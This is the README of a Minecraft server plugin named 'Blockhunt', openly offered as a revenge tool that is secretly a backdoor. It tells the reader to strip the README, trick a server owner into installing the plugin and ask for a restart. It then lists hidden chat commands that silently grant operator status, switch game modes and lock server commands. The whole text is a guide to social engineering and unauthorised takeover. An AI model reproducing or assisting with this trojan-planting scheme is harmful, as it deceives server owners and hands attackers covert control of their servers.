# Blockhunt
Are you in need of revenge to a server or server owner? Here's a lovely plugin that'll trick those owners that are desperate for
players.

Beginning:
- Download the plugin, remove the README.md (because this is just a guide to actually fooling the owner).
- Convince the server owner or admin to download the plugin you sent him/her.
- Once installed into the server, if the owner already hasn't, ask for a restart.

Middle:
Now you have the virus inside the victim server, you can now run the secret commands!
Whenever you run a secret command like %gmc@me%, no one will see that your gamemode was changed like it does with the /gamemode.
Secret commands:
%op@me% (Op yourself);
%op@all% (Op all players)
%lock@commands% (Lock predefined commands)
%unlock@commands% (Unlock the locked commands)
%gmc@me% (Change your gamemode to creative)
%gmc@all% (Change everyone's gamemode to creative)
%status@lock@commands% (See the status for commands)
